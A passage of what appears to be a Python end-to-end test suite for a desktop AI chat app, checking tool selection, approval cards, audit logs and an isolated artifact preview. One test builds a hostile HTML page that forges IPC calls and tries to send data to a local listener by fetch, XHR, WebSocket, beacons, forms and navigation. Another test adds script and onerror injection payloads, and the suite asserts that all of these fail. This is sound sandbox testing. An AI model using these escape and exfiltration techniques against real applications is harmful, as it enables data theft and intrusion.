    assert s.invoke("get_tool_selection") == {"auto": True, "max": 14}

    repo = c.work / "selection-repo"
    if not repo.exists():
        repo.mkdir()
        env = dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_AUTHOR_NAME="p", GIT_AUTHOR_EMAIL="p@p",
                   GIT_COMMITTER_NAME="p", GIT_COMMITTER_EMAIL="p@p")
        for cmd in [["git", "init", "-q", "-b", "main"], ["git", "commit", "-q", "--allow-empty", "-m", "init"]]:
            subprocess.run(cmd, cwd=repo, check=True, env=env)

    try:
        # Files, terminal and git on; everything else off.
        chat = new_chat(c, tools=[])
        registered = listing(chat)
        # The folder tools work only in Full access (0.0.5): the panel marks them so outside it.
        folder_tools = {"make_folder", "move_path", "delete_folder"}
        for n in folder_tools:
            assert not registered[n]["available"] and "Full access" in (registered[n]["schemaError"] or ""), registered[n]
        wanted = [n for n, t in registered.items() if t["server"] in ("files", "terminal", "git") and n not in folder_tools]
        assert len(wanted) == 14, wanted
        s.invoke("set_chat_tools", {"chatId": chat, "enabled": wanted + ["find_tools", "call_tool"]})
        tools = listing(chat)
        companions = [n for n, t in tools.items() if t["companion"] and n not in folder_tools]
        assert not any(tools[n]["enabledInChat"] for n in folder_tools), "a folder tool is on outside Full access"
        assert "find_tools" in companions and "call_tool" in companions, companions
        assert all(tools[n]["enabledInChat"] for n in companions), "a companion is off although tools are on"
        on = sorted(n for n, t in tools.items() if t["enabledInChat"] and not t["companion"])
        assert on == sorted(wanted), on
        assert tools["read_file"]["shown"] and not tools["git_status"]["shown"], (tools["read_file"], tools["git_status"])
        core = ["list_dir", "read_file", "search_files", "write_file", "edit_file"]

        # 1. A request about a file: the core and the companions, no git tool.
        Fake.requests.clear()
        Fake.queue.append({"tool_calls": [{"name": "find_tools", "arguments": {"query": "commit"}}]})
        Fake.queue.append({"tool_calls": [{"name": "call_tool", "arguments": {"name": "git_status", "arguments": {"repo": str(repo)}}}]})
        Fake.queue.append({"content": "SELECTION-FIRST-ANSWER"})
        send(s, "Please read the notes file and tell me what it says")
        s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "the approval card of git_status")
        card = s.page_text()
        s.screenshot(str(OUT / "tool-selection-card.png"))
        first = names(Fake.requests[0])
        notes.append("first request: " + json.dumps(first))
        for name in core + companions:
            assert name in first, f"{name} is not in the first request: {first}"
        assert not any(n.startswith("git_") for n in first), f"a git tool was shown: {first}"
        assert "run_command" not in first and "delete_file" not in first, first
        assert len(first) <= 14, first
        # `find_tools` ran without a card and told the model how to reach git_commit.
        found = json.dumps(Fake.requests[1]["messages"][-1])
        assert Fake.requests[1]["messages"][-1]["role"] == "tool" and "git_commit" in found and "call_tool" in found, found[:600]
        # 2. The card is git_status's own: its name, its server, its summary.
        assert "Allow once" in card, "call_tool ran git_status without a card: " + card[-400:]
        assert "git_status · git" in card, "the card does not name the real tool: " + card[-500:]
        assert "call_tool ·" not in card and "toolfinder" not in card, "the card names call_tool: " + card[-500:]
        assert "selection-repo" in card, card[-500:]
        time.sleep(0.9)
        s.click_button("Allow once")
        wait_idle(s)
        reqs = list(Fake.requests)
        assert len(reqs) == 3, len(reqs)
        assert all(names(r) == first for r in reqs), "the tool list changed within the turn"
        results = tool_results(chat)
        find_text = results[0]["text"]
        notes.append("find_tools commit: " + find_text.replace("\n", " | "))
        (OUT / "find_tools-commit.txt").write_text(find_text)
        assert "git_commit [Git]: " in find_text, find_text
        assert 'Example arguments: {"message": "Fix the date parser"}' in find_text, find_text
        assert 'Run it with call_tool: name "git_commit"' in find_text, find_text
        assert results[1]["status"] == "ok" and "main" in results[1]["text"], results[1]
        audit = s.invoke("list_audit", {"filter": {"chatId": chat}})
        rows = [(a["tool"], a["server"], a["decision"]) for a in audit]
        notes.append("audit: " + json.dumps(rows))
        assert ("git_status", "git", "allow_once") in rows, rows
        assert ("find_tools", "toolfinder", "allowed_without_prompt") in rows, rows
        assert not any(tool == "call_tool" for tool, _, _ in rows), "a call_tool row hides the real tool: " + json.dumps(rows)
        status_row = [a for a in audit if a["tool"] == "git_status"][0]
        assert json.loads(json.dumps(status_row["arguments"])) in ({"repo": str(repo)}, json.dumps({"repo": str(repo)})), status_row
        # Nothing was switched on by finding or calling.
        after = listing(chat)
        assert sorted(n for n, t in after.items() if t["enabledInChat"] and not t["companion"]) == sorted(wanted)

        # 3. The next turn shows what was found and used, added to the same list.
        Fake.requests.clear()
        Fake.queue.append({"content": "SELECTION-SECOND-ANSWER"})
        send(s, "thanks")
        wait_idle(s)
        second = names(Fake.requests[-1])
        notes.append("second request: " + json.dumps(second))
        assert "git_commit" in second and "git_status" in second, f"what was found is not shown: {second}"
        assert set(first) <= set(second) and in_order(first, second), f"the list did not only grow: {first} then {second}"
        assert len(second) <= 14, second
        assert listing(chat)["git_commit"]["shown"], "the Tools panel does not mark a found tool as shown"

        # 4. A tool that is off cannot be reached, and call_tool cannot call itself.
        target = c.work / "selection-nested.txt"
        Fake.queue.append({"tool_calls": [{"name": "call_tool", "arguments": {"name": "browser_navigate", "arguments": {"url": "https://example.com"}}}]})
        Fake.queue.append({"tool_calls": [{"name": "call_tool", "arguments": {"name": "call_tool", "arguments": {
            "name": "write_file", "arguments": {"path": str(target), "content": "x"}}}}]})
        Fake.queue.append({"content": "SELECTION-THIRD-ANSWER"})
        send(s, "try the page anyway")
        deadline = time.time() + 60
        while time.time() < deadline and not idle(s):
            assert "Allow once" not in s.page_text(), "a card was shown for a tool that is off, or for a nested call"
            time.sleep(0.3)
        wait_idle(s)
        refused = tool_results(chat)[-2:]
        notes.append("refusals: " + json.dumps([r["text"][:160] for r in refused]))
        assert refused[0]["status"] == "error" and "switched off" in refused[0]["text"], refused[0]
        assert refused[1]["status"] == "error" and "cannot run call_tool" in refused[1]["text"], refused[1]
        assert not target.exists(), "a nested call_tool wrote a file"
        assert not listing(chat)["browser_navigate"]["enabledInChat"], "a call switched the browser on"
        newest = s.invoke("list_audit", {"filter": {"chatId": chat}})[:2]
        assert all(a["tool"] == "call_tool" and a["decision"] == "refused_by_policy" for a in newest), newest

        # 5. The Tools panel: marks, the companions in one line, the count of tools that are on.
        s.click_button("Tools")
        s.wait_text("Choose tools for each task automatically", 10)
        time.sleep(0.4)
        panel = s.page_text()
        s.screenshot(str(OUT / "tools-panel-selection.png"))
        assert "on request" in panel and "shown" in panel, panel[-900:]
        assert "Always included with the tools above" in panel and "find_tools" in panel, panel[-900:]
        assert "Tools (14)" in panel, "the header does not count the tools that are on"
        # 6. The switch: off shows every tool that is on, and the finder tools are gone.
        s.execute("document.querySelector('input[role=switch]').click();")
        s.wait_for(lambda: s.invoke("get_tool_selection")["auto"] is False, 10, "the setting to be saved")
        time.sleep(0.4)
        assert "on request" not in s.page_text(), "a tool is still marked on request with the selection off"
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.3)
        off = listing(chat)
        assert not off["find_tools"]["enabledInChat"] and not off["call_tool"]["enabledInChat"], "the finder tools are offered with nothing hidden"
        Fake.requests.clear()
        Fake.queue.append({"content": "SELECTION-ALL-ANSWER"})
        send(s, "hello again")
        wait_idle(s)
        everything = names(Fake.requests[-1])
        notes.append("selection off: " + json.dumps(everything))
        for name in wanted:
            assert name in everything, f"{name} is on but was not sent with the selection off"
        assert "find_tools" not in everything and "call_tool" not in everything, everything
        notes.append(f"files+terminal+git: {len(everything)} tools, about {estimate(Fake.requests[-1])} tokens, with the selection off; "
                     f"{len(first)} tools, about {estimate(reqs[0])} tokens, on the first turn with it on")

        # 7. What the default tools of a new chat cost with and without the selection (for the notes).
        defaults = [n for n, t in registered.items()
                    if t["server"] in ("files", "skills", "artifacts", "search", "browser") and t["available"]]
        measured = {}
        for auto in (False, True):
            s.invoke("set_tool_selection", {"auto": auto})
            fresh = new_chat(c, tools=defaults)
            Fake.requests.clear()
            Fake.queue.append({"content": "ok"})
            send(s, "hello")
            wait_idle(s)
            measured[auto] = (len(names(Fake.requests[-1])), estimate(Fake.requests[-1]), len(json.dumps(Fake.requests[-1].get("tools", []))))
            del fresh
        notes.append(f"default tools of a new chat ({len(defaults)} switches): all sent: {measured[False][0]} tools, {measured[False][2]} characters, "
                     f"about {measured[False][1]} tokens; chosen: {measured[True][0]} tools, {measured[True][2]} characters, about {measured[True][1]} tokens")
        assert measured[True][0] < measured[False][0] or measured[False][0] <= 14, measured
    finally:
        s.invoke("set_tool_selection", {"auto": True})


@probe("artifacts")
def p_artifacts(c, notes):
    """Artifacts beside the chat (0.0.4): a page the model makes opens in the panel and
    what goes wrong in it comes back as the tool's result; a fixed version renders clean;
    a hostile page cannot reach the app, the window, storage or the network; the user
    edits, restores and exports; a diagram is drawn with the bundled library."""
    import re
    s = c.s
    chat = new_chat(c, tools=["create_artifact", "update_artifact", "read_artifact", "list_artifacts"])
    # The preview sandbox is checked when the window starts. Scripts run only after that.
    s.wait_for(lambda: s.invoke("artifact_isolation")["state"] == "proven", 40, "the preview sandbox check")
    visible = 'aside[aria-label="Workbench"] iframe[data-artifact]:not(.hidden)'
    # A debug build loads the app from the dev server, without the app's own policy. The two
    # rules of that policy the panel has to live with are put in place here, as configured:
    # which addresses the app may frame, and Trusted Types.
    csp = json.loads((ROOT / "src-tauri" / "tauri.conf.json").read_text())["app"]["security"]["csp"]
    rules = [d.strip() for d in csp.split(";") if d.strip().startswith(("frame-src ", "require-trusted-types-for "))]
    assert len(rules) == 2 and "artifact" in rules[0], rules
    s.execute(
        """
        const m = document.createElement('meta');
        m.httpEquiv = 'Content-Security-Policy';
        m.content = arguments[0];
        document.head.appendChild(m);
        window.__blocked = [];
        document.addEventListener('securitypolicyviolation', e => window.__blocked.push(e.violatedDirective + ' ' + e.blockedURI));
        """, "; ".join(rules))

    def results():
        return [m["toolResult"] for m in messages(s, chat) if m["role"] == "tool"]

    def frame():
        return s.execute(
            "const f = document.querySelector(arguments[0]);"
            "return f ? {key: f.getAttribute('data-artifact'), src: f.getAttribute('src'), sandbox: f.getAttribute('sandbox'),"
            " referrer: f.getAttribute('referrerpolicy')} : null;", visible)

    def in_frame(script):
        el = s.find(visible)
        s._req("POST", s._s("/frame"), {"id": {"element-6066-11e4-a52e-4f735466cecf": el}})
        try:
            return s.execute(script)
        finally:
            s._req("POST", s._s("/frame"), {"id": None})

    def call(name, arguments, say, ask):
        Fake.queue.append({"tool_calls": [{"name": name, "arguments": arguments}]})
        Fake.queue.append({"content": say})
        before = len(results())
        # A real click first: after a look inside the preview frame, the keys would go there.
        # A dialog that is closing still covers the page until its animation has ended.
        s.wait_for(lambda: not s.execute("return !!document.querySelector('.dialog-overlay');"), 10, "dialogs closed")
        s.click(s.find("textarea"))
        send(s, ask)
        wait_idle(s)
        assert "Allow once" not in s.page_text(), f"{name} showed an approval card"
        assert len(results()) == before + 1, f"{name} was not called ({ask!r} was not sent?)"
        return results()[-1]["text"]

    # ---- A page with a mistake: the panel opens on it and the result names the error.
    broken = ("<!doctype html>\n<html>\n<body>\n<h1>Counter</h1>\n<button id=\"add\">Add one</button>\n<p id=\"n\">0</p>\n<script>\n"
              "let count = 0;\n"
              "document.getElementById('add').addEventListener('click', () => { count += 1; document.getElementById('n').textContent = count; });\n"
              "startCounter();\n"
              "</script>\n</body>\n</html>\n")
    text = call("create_artifact", {"title": "Counter", "kind": "html", "content": broken}, "I made a counter page.", "make a counter page")
    notes.append("create result: " + text.replace("\n", " | "))
    made = re.match(r'Artifact #(\d+) "Counter" \(html\), version 1 saved\.\n', text)
    assert made, text
    aid = int(made.group(1))
    assert "The preview reported 1 problem:" in text and "startCounter" in text, text
    assert re.search(r"^- 10:\d+ .*startCounter", text, re.M), "the error is not placed on line 10 of the page: " + text
    assert text.rstrip().endswith("save a corrected version with update_artifact."), text
    f = frame()
    notes.append("frame: " + json.dumps(f))
    assert f and f["key"] == f"{aid}:1", f
    assert f["sandbox"] == "allow-scripts" and f["referrer"] == "no-referrer", f
    # The address carries a ticket the app issued for this one frame.
    assert re.fullmatch(rf"artifact://sandbox\.localhost/{aid}/1\?t=[0-9a-f]{{32}}", f["src"]), f
    panel = s.execute("return document.querySelector('aside[aria-label=\"Workbench\"]').innerText;")
    assert "The preview reported a problem" in panel and "startCounter" in panel, panel[-400:]
    assert "Open artifact" in s.page_text(), "the tool card has no button for the artifact"
    audit = [(a["tool"], a["decision"]) for a in s.invoke("list_audit", {"filter": {"chatId": chat}})]
    assert ("create_artifact", "allowed_without_prompt") in audit, audit
    s.click_button("Ask the model to fix these")
    time.sleep(0.4)
    box = s.execute("return document.querySelector('textarea').value;")
    assert "reported this problem" in box and "startCounter" in box and f"artifact #{aid}, version 1" in box, box
    s.execute(
        "const el = document.querySelector('textarea');"
        "Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(el, '');"
        "el.dispatchEvent(new Event('input', {bubbles: true}));")
    s.screenshot(str(OUT / "artifacts-problem.png"))

    # ---- The fix: one exact piece replaced, and the preview is clean. The page works.
    text = call("update_artifact", {"id": aid, "old_text": "startCounter();\n", "new_text": ""}, "Fixed.", "fix it")
    notes.append("update result: " + text.replace("\n", " | "))
    assert text.startswith(f'Artifact #{aid} "Counter" (html), version 2 saved.'), text
    assert text.rstrip().endswith("Rendered without errors."), text
    assert frame()["key"] == f"{aid}:2", frame()
    assert in_frame("document.getElementById('add').click(); return document.getElementById('n').textContent;") == "1"
    assert "The preview reported" not in s.execute("return document.querySelector('aside[aria-label=\"Workbench\"]').innerText;")

    # ---- A frame's address loads once. The address of the frame on screen, loaded a second
    # time, shows nothing; an address the app issues for a new frame does.
    used = frame()["src"]
    fresh = s.invoke("artifact_frame", {"chatId": chat, "id": aid, "version": 2})
    assert fresh["running"] == "page" and fresh["url"] != used, fresh
    s.execute(
        """
        window.__replay = {used: [], fresh: []};
        for (const [name, url] of [['used', arguments[0]], ['fresh', arguments[1]]]) {
          const f = document.createElement('iframe');
          f.setAttribute('sandbox', 'allow-scripts');
          f.style.display = 'none';
          f.dataset.replay = name;
          window.addEventListener('message', e => {
            if (e.source === f.contentWindow && e.data && e.data.source === 'artifact') window.__replay[name].push(e.data.kind);
          });
          f.src = url;
          document.body.appendChild(f);
        }
        """, used, fresh["url"])
    s.wait_for(lambda: "ready" in s.execute("return window.__replay.fresh;"), 10, "a page loaded with a new ticket")
    time.sleep(0.8)
    replay = s.execute("return window.__replay;")
    notes.append("a used address loaded again: " + json.dumps(replay))
    assert replay["used"] == [], "a frame's address loaded a second time: " + json.dumps(replay)
    s.execute("document.querySelectorAll('iframe[data-replay]').forEach(f => f.remove());")
    # Without a ticket, and for an artifact of another chat, the app issues nothing.
    for bad in ({"chatId": chat + 999, "id": aid, "version": 2}, {"chatId": chat, "id": aid, "version": 99}):
        try:
            s.invoke("artifact_frame", bad)
            raise AssertionError(f"a frame address was issued for {bad}")
        except AssertionError:
            raise
        except Exception:
            pass

    # ---- A hostile page. Every way out must be closed.
    class Leak(BaseHTTPRequestHandler):
        seen = []

        def log_message(self, *a):
            pass

        def _any(self):
            Leak.seen.append(f"{self.command} {self.path}")
            body = b"leak"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = do_POST = do_HEAD = do_OPTIONS = _any

    leak_port = free_port()
    leak = ThreadingHTTPServer(("127.0.0.1", leak_port), Leak)
    threading.Thread(target=leak.serve_forever, daemon=True).start()
    counts = {}

    def tcp_counter(name):
        sock = socket.socket()
        sock.bind(("127.0.0.1", 0))
        sock.listen(8)
        counts[name] = 0

        def accept():
            while True:
                try:
                    conn, _ = sock.accept()
                    counts[name] += 1
                    conn.close()
                except OSError:
                    return
        threading.Thread(target=accept, daemon=True).start()
        return sock.getsockname()[1]

    hint_in_markup, hint_from_script = tcp_counter("markup"), tcp_counter("script")
    L = f"http://127.0.0.1:{leak_port}"
    hostile = (
        "<!doctype html>\n<html><head>\n"
        f"<link rel=\"preconnect\" href=\"http://127.0.0.1:{hint_in_markup}\">\n"
        "</head><body><pre id=\"out\"></pre>\n<script>\n(async function () {\n"
        "  var F = {};\n"
        f"  var L = \"{L}\";\n"
        "  function rec(k, v) { F[k] = String(v).slice(0, 160); }\n"
        "  function attempt(k, f) { try { rec(k, f()); } catch (e) { rec(k, 'threw ' + e); } }\n"
        "  async function net(k, f) { try { rec(k, await f()); } catch (e) { rec(k, 'failed ' + e); } }\n"
        "  rec('origin', window.origin);\n"
        "  rec('tauri_internals', typeof window.__TAURI_INTERNALS__);\n"
        "  rec('tauri_global', typeof window.__TAURI__);\n"
        "  rec('ipc', typeof window.ipc);\n"
        "  attempt('raw_channel', function () { return typeof window.webkit.messageHandlers.ipc.postMessage; });\n"
        "  attempt('raw_call', function () { window.webkit.messageHandlers.ipc.postMessage(JSON.stringify({cmd: 'create_chat', callback: 1, error: 2, payload: {modelRef: 'forged-by-a-preview'}, __TAURI_INVOKE_KEY__: 'forged'})); return 'sent'; });\n"
        "  attempt('localStorage', function () { localStorage.setItem('a', '1'); return 'available'; });\n"
        "  attempt('sessionStorage', function () { sessionStorage.setItem('a', '1'); return 'available'; });\n"
        "  attempt('indexedDB', function () { indexedDB.open('x'); return 'available'; });\n"
        "  attempt('cookie', function () { document.cookie = 'a=1'; return document.cookie === '' ? 'blocked' : 'available'; });\n"
        "  attempt('parent_document', function () { return 'reached ' + window.parent.document.title; });\n"
        "  attempt('parent_internals', function () { return 'reached ' + typeof window.parent.__TAURI_INTERNALS__; });\n"
        "  attempt('top_location_read', function () { return 'reached ' + window.top.location.href; });\n"
        "  attempt('top_navigate', function () { window.top.location = L + '/leak-topnav'; return 'assigned'; });\n"
        "  attempt('window_open', function () { return window.open(L + '/leak-open') ? 'opened' : 'blocked'; });\n"
        "  await net('fetch', async function () { var r = await fetch(L + '/leak-fetch'); return 'ok ' + r.status; });\n"
        "  await net('fetch_nocors', async function () { var r = await fetch(L + '/leak-nocors', {mode: 'no-cors'}); return 'ok ' + r.type; });\n"
        "  await net('fetch_ipc', async function () { var r = await fetch('ipc://localhost/create_chat', {method: 'POST', body: '{}'}); return 'ok ' + r.status; });\n"
        "  await net('fetch_app', async function () { var r = await fetch('tauri://localhost/index.html'); return 'ok ' + r.status; });\n"
        "  await net('xhr', function () { return new Promise(function (res) { var x = new XMLHttpRequest(); x.open('GET', L + '/leak-xhr'); x.onload = function () { res('ok ' + x.status); }; x.onerror = function () { res('failed'); }; try { x.send(); } catch (e) { res('threw ' + e); } }); });\n"
        f"  await net('websocket', function () {{ return new Promise(function (res) {{ try {{ var w = new WebSocket('ws://127.0.0.1:{leak_port}/leak-ws'); w.onopen = function () {{ res('ok open'); }}; w.onerror = function () {{ res('failed'); }}; }} catch (e) {{ res('threw ' + e); }} setTimeout(function () {{ res('failed timeout'); }}, 700); }}); }});\n"
        "  await net('eventsource', function () { return new Promise(function (res) { try { var w = new EventSource(L + '/leak-es'); w.onopen = function () { res('ok open'); }; w.onerror = function () { res('failed'); }; } catch (e) { res('threw ' + e); } setTimeout(function () { res('failed timeout'); }, 700); }); });\n"
        "  attempt('beacon', function () { navigator.sendBeacon(L + '/leak-beacon', 'x'); return 'tried'; });\n"
        "  await net('img', function () { return new Promise(function (res) { var i = new Image(); i.onload = function () { res('ok loaded'); }; i.onerror = function () { res('failed'); }; i.src = L + '/leak-img'; }); });\n"
        "  attempt('form', function () { var f = document.createElement('form'); f.action = L + '/leak-form'; document.body.appendChild(f); f.submit(); return 'tried'; });\n"
        "  attempt('child_frame', function () { var i = document.createElement('iframe'); i.src = L + '/leak-frame'; document.body.appendChild(i); return 'tried'; });\n"
        f"  attempt('hint', function () {{ var l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://127.0.0.1:{hint_from_script}'; document.head.appendChild(l); return 'tried'; }});\n"
        "  attempt('eval', function () { return 'ran ' + eval('1 + 1'); });\n"
        "  document.getElementById('out').textContent = JSON.stringify(F, null, 1);\n"
        "  window.parent.postMessage({source: 'isolation-probe', findings: F}, '*');\n"
        "  window.parent.postMessage({source: 'artifact', id: 1, version: 1, kind: 'problem', message: 'for another artifact'}, '*');\n"
        "  window.parent.postMessage('junk', '*');\n"
        "  setTimeout(function () { location.href = L + '/leak-selfnav'; }, 400);\n"
        "})();\n</script>\n</body></html>\n")
    s.execute(
        """
        window.__isolation = [];
        window.addEventListener('message', e => {
          if (e.data && e.data.source === 'isolation-probe') {
            const f = document.querySelector(arguments[0]);
            window.__isolation.push({findings: e.data.findings, origin: e.origin, fromFrame: !!f && e.source === f.contentWindow});
          }
        });
        """, visible)
    chats_before = len(s.invoke("list_chats", {"query": None}))
    app_url = s.execute("return location.href;")
    text = call("create_artifact", {"title": "Probe", "kind": "html", "content": hostile}, "Here is the probe.", "make the probe page")
    probe_id = int(re.match(r"Artifact #(\d+) ", text).group(1))
    got = s.wait_for(lambda: s.execute("return window.__isolation.length ? window.__isolation[0] : null;"), 15, "the probe's report")
    time.sleep(1.5)  # the page's last attempt (it sends itself to another address) runs after its report
    F = got["findings"]
    notes.append("isolation probe: " + json.dumps(F, sort_keys=True))
    assert got["fromFrame"] is True and got["origin"] == "null", got
    assert F["origin"] == "null", F["origin"]
    for key in ("tauri_internals", "tauri_global", "ipc"):
        assert F[key] == "undefined", f"{key}: {F[key]}"
    must_fail = ["localStorage", "sessionStorage", "indexedDB", "cookie", "parent_document", "parent_internals", "top_location_read",
                 "top_navigate", "window_open", "fetch", "fetch_nocors", "fetch_ipc", "fetch_app", "xhr", "websocket", "eventsource",
                 "img", "eval"]
    for key in must_fail:
        assert F[key].startswith(("threw", "failed", "blocked")), f"{key} was not stopped: {F[key]}"
    # Whatever the page thought happened: nothing reached the server, the window is where it was.
    assert Leak.seen == [], f"a request left the preview: {Leak.seen}"
    assert s.execute("return location.href;") == app_url, "the window was moved"
    assert counts["markup"] == 0, "a preconnect hint in the page's markup opened a connection"
    notes.append(f"preconnect hint made by a script: {counts['script']} connection(s) (a browser opens these outside any page rule; see ARCHITECTURE)")
    # The raw message channel exists in a WebKit frame, but a call without the app's key is dropped.
    notes.append(f"raw channel in the frame: {F['raw_channel']}; forged call: {F['raw_call']}")
    time.sleep(0.5)
    after = s.invoke("list_chats", {"query": None})
    assert len(after) == chats_before, "a forged call from the preview created a chat"
    assert s.invoke("artifact_isolation")["state"] == "proven"
    # Messages that are not this preview's own are ignored: no problem shown, nothing broken.
    panel = s.execute("return document.querySelector('aside[aria-label=\"Workbench\"]').innerText;")
    assert "for another artifact" not in panel, panel[-300:]
    leak.shutdown()
    s.screenshot(str(OUT / "artifacts-isolation.png"))

    # ---- The user edits the source and saves version 3.
    s.execute(
        """
        const row = [...document.querySelectorAll('ul[aria-label="Artifacts of this chat"] button')].find(b => b.innerText.includes('Counter'));
        row.click();
        """)
    s.wait_for(lambda: (frame() or {}).get("key") == f"{aid}:2", 10, "the counter is shown again")
    s.execute("[...document.querySelectorAll('[aria-label=\"Artifact view\"] [role=tab]')].find(b => b.innerText === 'Source').click();")
    time.sleep(0.4)
    edited = broken.replace("startCounter();\n", "").replace("<h1>Counter</h1>", "<h1>My counter</h1>")
    s.execute(
        """
        const el = document.querySelector('aside[aria-label="Workbench"] textarea');
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(el, arguments[0]);
        el.dispatchEvent(new Event('input', {bubbles: true}));
        """, edited)
    # Unsaved text survives a look at the preview.
    s.execute("[...document.querySelectorAll('[aria-label=\"Artifact view\"] [role=tab]')].find(b => b.innerText === 'Preview').click();")
    time.sleep(0.3)
    s.execute("[...document.querySelectorAll('[aria-label=\"Artifact view\"] [role=tab]')].find(b => b.innerText === 'Source').click();")
    time.sleep(0.3)
    assert s.execute("return document.querySelector('aside[aria-label=\"Workbench\"] textarea').value;") == edited
    s.click_button("Save as new version")
    s.wait_for(lambda: s.invoke("get_artifact", {"chatId": chat, "id": aid, "version": None})["artifact"]["latestVersion"] == 3, 10, "version 3")
    d = s.invoke("get_artifact", {"chatId": chat, "id": aid, "version": None})
    assert d["content"] == edited and d["versions"][-1]["author"] == "user", d["versions"]

    # ---- Restoring version 1 makes version 4.
    for _ in range(2):
        s.click_button("Older version")
        time.sleep(0.5)
    s.wait_for(lambda: "Version 1 of 3" in s.page_text(), 10, "version 1 shown")
    s.click_button("Restore this version")
    s.wait_for(lambda: s.invoke("get_artifact", {"chatId": chat, "id": aid, "version": None})["artifact"]["latestVersion"] == 4, 10, "version 4")
    d = s.invoke("get_artifact", {"chatId": chat, "id": aid, "version": None})
    assert d["content"] == broken, "version 4 is not the content of version 1"
    assert d["versions"][-1]["note"] == "Restored from version 1" and d["versions"][-1]["author"] == "user", d["versions"][-1]
    assert [v["version"] for v in d["versions"]] == [1, 2, 3, 4]

    # ---- Export writes the chosen version to the chosen file, and only as a document of its kind.
    target = OUT / "exported-counter.html"
    written = s.invoke("export_artifact", {"chatId": chat, "id": aid, "version": 3, "path": str(target)})
    assert pathlib.Path(written).read_text() == edited, written
    try:
        s.invoke("export_artifact", {"chatId": chat, "id": aid, "version": 3, "path": str(OUT / "exported-counter.sh")})
        raise AssertionError("an export under another extension was accepted")
    except WebDriverError as e:
        assert "ends in .html" in str(e), e

    # ---- A diagram is drawn by the library bundled in the app.
    text = call("create_artifact", {"title": "Flow", "kind": "mermaid", "content": "graph TD\n  A[Start] --> B{Ready?}\n  B -->|yes| C[Done]\n"},
                "Here is the diagram.", "draw the flow")
    notes.append("mermaid result: " + text.replace("\n", " | "))
    assert text.rstrip().endswith("Rendered without errors."), text
    drawn = in_frame("const svg = document.querySelector('#diagram svg'); return svg ? svg.querySelectorAll('g').length : -1;")
    assert drawn > 0, f"no diagram was drawn ({drawn})"
    text = call("update_artifact", {"id": int(re.match(r"Artifact #(\d+) ", text).group(1)), "content": "graph TD\n  A --> \n  B -->"},
                "Updated.", "break the diagram")
    assert "The preview reported 1 problem:" in text and "Parse error" in text, text
    s.screenshot(str(OUT / "artifacts-diagram.png"))

    # ---- A document is shown by the app itself, as text; it can be renamed and deleted.
    text = call("create_artifact", {"title": "Plan", "kind": "markdown",
                                    "content": "# Trip plan\n\n- pack\n\n<script>window.__pwned = 1</script>\n<img src=x onerror=\"window.__pwned = 2\">\n"},
                "Here is the plan.", "write the plan")
    plan = re.fullmatch(r'Artifact #(\d+) "Plan" \(markdown\), version 1 saved\.', text.strip())
    assert plan, text
    plan_id = int(plan.group(1))
    s.wait_for(lambda: s.execute("const h = document.querySelector('aside[aria-label=\"Workbench\"] h1'); return h ? h.innerText : null;") == "Trip plan",
               10, "the document's heading")
    assert frame() is None, "a document was put into a frame"
    assert s.execute("return window.__pwned || null;") is None, "markup in a document ran"
    s.click_button("Rename")
    time.sleep(0.3)
    s.execute(
        """
        const el = document.querySelector('aside[aria-label="Workbench"] input[aria-label="Title"]');
        Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(el, arguments[0]);
        el.dispatchEvent(new Event('input', {bubbles: true}));
        """, "Trip plan (final)")
    s.click_button("Rename")
    titles = lambda: {a["id"]: a["title"] for a in s.invoke("list_artifacts", {"chatId": chat})}  # noqa: E731
    s.wait_for(lambda: titles().get(plan_id) == "Trip plan (final)", 10, "the new title")
    s.click_button("Delete artifact")
    s.wait_text("Delete this artifact?", 10)
    s.execute("[...document.querySelectorAll('[role=alertdialog] button')].find(b => b.innerText === 'Delete artifact').click();")
    s.wait_for(lambda: plan_id not in titles(), 10, "the artifact is gone")
    assert aid in titles(), "deleting one artifact removed another"

    # ---- With the sandbox not proven, nothing a page wrote runs.
    s.invoke("artifact_canary", {"nonce": "e2e"})
    s.wait_for(lambda: "Scripts are switched off in previews" in s.page_text(), 10, "the notice")
    assert s.invoke("artifact_isolation")["state"] == "broken"
    s.wait_for(lambda: (frame() or {}).get("sandbox") == "", 10, "the frame without scripts")
    text = call("create_artifact", {"title": "Quiet", "kind": "html", "content": "<p>hello</p><script>parent.postMessage({source: 'isolation-probe', findings: {ran: true}}, '*')</script>"},
                "Made.", "make a quiet page")
    assert "Not checked: scripts are switched off in previews" in text, text
    time.sleep(1.0)
    assert s.execute("return window.__isolation.length;") == 1, "a script ran in a preview while scripts were off"
    s.click_button("Check again")
    s.wait_for(lambda: s.invoke("artifact_isolation")["state"] == "proven", 30, "the check passes again")
    # Under the app's own rules: no preview was refused its frame, and the panel broke no rule.
    blocked = s.execute("return window.__blocked;")
    notes.append("refused by the app's frame and Trusted Types rules: " + json.dumps(blocked))
    assert not any("artifact" in b for b in blocked), blocked
    assert not any("trusted" in b.lower() for b in blocked), blocked
    del probe_id

    # ---- A page the model writes after it read something from outside the conversation
    # is shown without its scripts until the user allows them, version by version.
    tools = ["create_artifact", "update_artifact", "read_artifact", "list_artifacts", "read_file"]
    chat2 = new_chat(c, tools=tools)
    s.execute(
        "window.__held = [];"
        "window.addEventListener('message', e => { if (e.data && e.data.source === 'held-probe') window.__held.push(e.data.n); });")
    after = "<p id=\"o\">static</p><script>parent.postMessage({source: 'held-probe', n: %d}, '*')</script>"

    def tool_texts():
        return [m["toolResult"]["text"] for m in messages(s, chat2) if m["role"] == "tool"]

    Fake.queue.append({"tool_calls": [{"name": "read_file", "arguments": {"path": str(c.work / "notes.txt")}}]})
    Fake.queue.append({"tool_calls": [{"name": "create_artifact", "arguments": {"title": "From notes", "kind": "html", "content": after % 1}}]})
    Fake.queue.append({"content": "I made a page from your notes."})
    s.click(s.find("textarea"))
    send(s, "read my notes and make a page of them")
    answer_card(s, "Allow once")
    wait_idle(s)
    held_text = tool_texts()[-1]
    notes.append("held result: " + held_text.replace("\n", " | "))
